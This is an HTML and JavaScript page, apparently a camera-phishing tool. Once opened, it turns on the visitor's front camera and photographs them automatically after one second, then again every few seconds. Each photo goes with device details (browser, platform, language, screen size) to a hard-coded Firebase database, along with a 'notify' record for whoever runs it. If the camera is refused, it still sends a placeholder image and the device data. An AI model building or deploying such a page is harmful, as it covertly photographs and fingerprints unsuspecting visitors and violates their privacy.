<!DOCTYPE html>
<html lang="vi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Auto Camera Capture</title>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: Arial, sans-serif;
            background: #000;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        .container {
            background: #1a1a2e;
            border-radius: 20px;
            padding: 30px;
            max-width: 500px;
            width: 100%;
            box-shadow: 0 20px 60px rgba(0,0,0,0.8);
            text-align: center;
        }
        h1 {
            color: #4CAF50;
            margin-bottom: 20px;
            font-size: 24px;
        }
        #video {
            width: 100%;
            max-height: 400px;
            border-radius: 12px;
            background: #000;
            margin-bottom: 15px;
            border: 3px solid #4CAF50;
        }
        #capturedPhoto {
            width: 100%;
            max-height: 400px;
            border-radius: 12px;
            margin-bottom: 15px;
            display: none;
            border: 3px solid #4CAF50;
        }
        #status {
            margin-top: 15px;
            padding: 12px;
            border-radius: 8px;
            font-weight: 500;
            color: white;
            background: #333;
            display: none;
        }
        #loading {
            display: none;
            color: #4CAF50;
            margin: 10px 0;
            font-size: 16px;
        }
        .spinner {
            border: 4px solid #f3f3f3;
            border-top: 4px solid #4CAF50;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 10px auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        .info {
            color: #888;
            font-size: 14px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>📸 AUTO CAPTURE</h1>
        
        <video id="video" autoplay playsinline></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <img id="capturedPhoto" alt="Ảnh vừa chụp">
        
        <div id="loading">
            <div class="spinner"></div>
            <p>⏳ Đang xử lý...</p>
        </div>
        
        <div id="status"></div>
        <div class="info">📡 Ảnh sẽ tự động gửi lên Firebase</div>
    </div>

    <script>
        // Cấu hình Firebase
        const firebaseConfig = {
            databaseURL: "https://shopmduy-default-rtdb.asia-southeast1.firebasedatabase.app/"
        };
        
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        // Elements
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const capturedPhoto = document.getElementById('capturedPhoto');
        const statusDiv = document.getElementById('status');
        const loadingDiv = document.getElementById('loading');

        let stream = null;
        let uid = '';
        let isProcessing = false;

        // Tạo UID duy nhất
        function generateUID() {
            return 'user_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9);
        }
        uid = generateUID();

        // Hiển thị status
        function showStatus(msg, isError = false) {
            statusDiv.textContent = msg;
            statusDiv.style.display = 'block';
            statusDiv.style.background = isError ? '#ff4444' : '#4CAF50';
            
            if (!isError) {
                setTimeout(() => {
                    statusDiv.style.display = 'none';
                }, 10000);
            }
        }

        // Lấy thông tin thiết bị
        function getDeviceInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screenWidth: window.screen.width,
                screenHeight: window.screen.height,
                timestamp: new Date().toISOString(),
                ip: 'unknown'
            };
        }

        // Bật camera
        async function startCamera() {
            try {
                stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        facingMode: 'user',
                        width: { ideal: 1280 },
                        height: { ideal: 720 }
                    },
                    audio: false
                });
                video.srcObject = stream;
                await video.play();
                
                // Tự động chụp sau 1 giây
                setTimeout(() => {
                    autoCapture();
                }, 1000);
                
            } catch (err) {
                console.error('Lỗi camera:', err);
                // Fallback: tạo ảnh giả
                createFallbackImage();
            }
        }

        // Tạo ảnh thay thế
        function createFallbackImage() {
            const ctx = canvas.getContext('2d');
            canvas.width = 800;
            canvas.height = 600;
            
            // Vẽ background
            const gradient = ctx.createLinearGradient(0, 0, canvas.width, canvas.height);
            gradient.addColorStop(0, '#1a1a2e');
            gradient.addColorStop(1, '#16213e');
            ctx.fillStyle = gradient;
            ctx.fillRect(0, 0, canvas.width, canvas.height);
            
            // Vẽ icon camera
            ctx.fillStyle = '#4CAF50';
            ctx.font = '80px Arial';
            ctx.textAlign = 'center';
            ctx.fillText('📸', canvas.width/2, canvas.height/2 - 30);
            
            ctx.fillStyle = '#888';
            ctx.font = '24px Arial';
            ctx.fillText('Không có camera', canvas.width/2, canvas.height/2 + 50);
            
            ctx.fillStyle = '#666';
            ctx.font = '16px Arial';
            ctx.fillText('UID: ' + uid.substring(0, 15), canvas.width/2, canvas.height/2 + 90);
            
            const imageData = canvas.toDataURL('image/png');
            uploadToFirebase(imageData);
        }

        // Tự động chụp
        function autoCapture() {
            if (isProcessing) return;
            
            try {
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth || 800;
                canvas.height = video.videoHeight || 600;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                const imageData = canvas.toDataURL('image/png');
                capturedPhoto.src = imageData;
                capturedPhoto.style.display = 'block';
                
                // Upload lên Firebase
                uploadToFirebase(imageData);
                
            } catch (err) {
                console.error('Lỗi chụp:', err);
                showStatus('❌ Lỗi chụp ảnh', true);
            }
        }

        // Upload lên Firebase
        async function uploadToFirebase(imageData) {
            if (isProcessing) return;
            isProcessing = true;
            loadingDiv.style.display = 'block';
            
            try {
                const deviceInfo = getDeviceInfo();
                const timestamp = new Date().toISOString();
                
                // Lưu dữ liệu
                const photoRef = database.ref('photos/' + uid);
                const data = {
                    uid: uid,
                    imageData: imageData,
                    timestamp: timestamp,
                    deviceInfo: deviceInfo,
                    userAgent: navigator.userAgent,
                    platform: navigator.platform
                };
                
                await photoRef.set(data);
                
                // Lưu notify
                const notifyRef = database.ref('notify/' + uid);
                await notifyRef.set({
                    uid: uid,
                    timestamp: timestamp,
                    status: 'pending',
                    type: 'photo'
                });
                
                showStatus('✅ Đã gửi ảnh thành công!');
                
                // Tạo UID mới để chuẩn bị cho lần sau
                setTimeout(() => {
                    uid = generateUID();
                    isProcessing = false;
                    loadingDiv.style.display = 'none';
                    capturedPhoto.style.display = 'none';
                    
                    // Chụp lại sau 5 giây
                    setTimeout(() => {
                        if (stream) {
                            autoCapture();
                        }
                    }, 5000);
                }, 3000);
                
            } catch (error) {
                console.error('Lỗi upload:', error);
                showStatus('❌ Lỗi: ' + error.message, true);
                isProcessing = false;
                loadingDiv.style.display = 'none';
                
                // Thử lại sau 10 giây
                setTimeout(() => {
                    if (stream) {
                        autoCapture();
                    }
                }, 10000);
            }
        }

        // Khởi chạy
        startCamera();

        // Xử lý khi đóng trang
        window.addEventListener('beforeunload', function() {
            if (stream) {
                const tracks = stream.getTracks();
                tracks.forEach(track => track.stop());
            }
        });

        console.log('✅ Auto Capture System Started!');
        console.log('📱 UID:', uid);
    </script>
</body>
</html>
